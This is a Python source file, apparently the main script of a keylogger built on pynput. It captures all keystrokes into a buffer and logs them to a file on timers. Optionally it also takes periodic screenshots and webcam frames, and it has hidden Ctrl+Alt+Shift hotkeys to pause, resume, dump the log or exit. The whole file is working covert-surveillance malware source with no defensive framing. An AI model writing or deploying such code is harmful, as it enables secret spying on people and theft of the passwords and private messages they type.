import sys
from log import logger, screenshot
from pynput import keyboard
from pynput.keyboard import Key, Listener, KeyCode, Controller
from countdown import Countdown
from util import utilities
from log import camcapture
from decorators.decorators import catch_exception

S_code = 83
P_code = 80
D_code = 68
T_code = 84

is_ctrl_pressed:bool = False
is_alt_pressed:bool = False
is_shift_pressed:bool = False
should_register:bool = True
should_capture_screenshots:bool = False
should_capture_webcam:bool = False
screenshot_interval:int = 4
webcam_capture_interval:int = 17
is_idle:bool = True
key_buffer:list[str] = list()
buffer_capacity:int = 500
elements_to_preserve:int = 20

lang_change_listener:Listener
_keyboard = Controller()


@catch_exception(print_trace=True)
def on_pressed(key):
    global key_buffer, is_alt_pressed, is_shift_pressed, is_ctrl_pressed, is_idle
    if isinstance(key, KeyCode):
        if is_ctrl_pressed or is_alt_pressed:
            __check_for_special_handling(ord(key.char))
        else:
            is_idle = False
            if should_register:
                # print(key.char)
                key_buffer.append(key.char)
    else:
        if __check_for_combination_key(key):
            return

        if should_register:
            if key == Key.space:
                is_idle = False
                # print(" ")
                key_buffer.append(" ")
            elif key == Key.backspace:
                if len(key_buffer) > 0:
                    del key_buffer[-1]
            elif key == Key.enter:
                is_idle = False
                # print("\n")
                key_buffer.append("\n")

    if len(key_buffer) == buffer_capacity:
        __log_buffer()


def on_release(key):
    if key == Key.ctrl_l:
        global is_ctrl_pressed
        is_ctrl_pressed = False
    elif key == Key.alt_l:
        global is_alt_pressed
        is_alt_pressed = False
    elif key == Key.shift_l:
        global is_shift_pressed
        is_shift_pressed = False


def __check_for_combination_key(key) -> bool:
    global is_ctrl_pressed, is_alt_pressed, is_shift_pressed

    if key == Key.ctrl_l:
        is_ctrl_pressed = True
        return True
    elif key == Key.alt_l:
        is_alt_pressed = True
        return True
    elif key == Key.shift_l:
        is_shift_pressed = True
        return True

    return False


def __check_for_special_handling(unicode):
    if is_alt_pressed and is_shift_pressed and is_ctrl_pressed:
        global should_register,key_buffer

        if   unicode == P_code:     #stop recording and timers
            should_register = False
        elif unicode == S_code:     #start recording and timers again
            should_register = True
        elif unicode == D_code:     #force dump contents of array in file
            __log_buffer(is_dump=True)
        elif unicode == T_code:     #wait for log to complete if ongoing, and exit
            __exit_safely()


def __log_buffer(is_dump:bool=False):
    global key_buffer, elements_to_preserve, is_idle
    if is_dump:
        logger.log_to_file(buffer=key_buffer, is_dump=is_dump)
        key_buffer = list()
    else:
        new_buffer = key_buffer[len(key_buffer)-elements_to_preserve:]
        logger.log_to_file(buffer=key_buffer,elements_to_skip=elements_to_preserve)
        key_buffer = new_buffer


def __check_for_new_characters():
    global is_idle
    if not is_idle or len(key_buffer) == 0:
        is_idle = True
        return

    __log_buffer(is_dump=True)


def __take_screenshot():
    global is_idle
    if not is_idle:
        screenshot.take_screenshot()


def __make_cam_capture():
    global is_idle
    if not is_idle:
        camcapture.capture_cam_frame()


def __exit_safely():
    __shutdown_executors()
    logger.queue_callback(__exit_immediately)


def __exit_immediately(*args):
    exit(0)


def __init_executors():
    logger.init()
    Countdown.make_and_start("backup logs", 25 * 60, __check_for_new_characters)
    if should_capture_screenshots:
        Countdown.make_and_start("screenshots", 3 * 60, __take_screenshot)
    if should_capture_webcam:
        Countdown.make_and_start("cam capture", 17 * 60, __make_cam_capture)


def __shutdown_executors():
    logger.shutdown()
    Countdown.stop_all()


def __read_program_args():
    global should_capture_screenshots, should_capture_webcam, webcam_capture_interval, screenshot_interval
    if len(sys.argv) > 1:
        count = 1
        while count < len(sys.argv):
            if sys.argv[count] == '-s':
                count += 1
                should_capture_screenshots = True
                if count < len(sys.argv):
                    intval = utilities.as_int(sys.argv[count])
                    if intval is None: continue
                    screenshot_interval = 1 if intval < 1 else intval
            elif sys.argv[count] == '-w':
                count += 1
                should_capture_webcam = True
                if count < len(sys.argv):
                    intval = utilities.as_int(sys.argv[count])
                    if intval is None: continue
                    webcam_capture_interval = 1 if intval < 1 else intval
            count += 1
    print('should screens {} with interval {}  ,  should webcam {}  with interval {}'.format(should_capture_screenshots,
                                                                                             screenshot_interval,
                                                                                             should_capture_webcam,                                                                                            webcam_capture_interval))



# ________________________________________ START _________________________________________________

__read_program_args()
__init_executors()

with keyboard.Listener(on_press=on_pressed, on_release=on_release) as listener:
    # print(threading.active_count())
    listener.join()

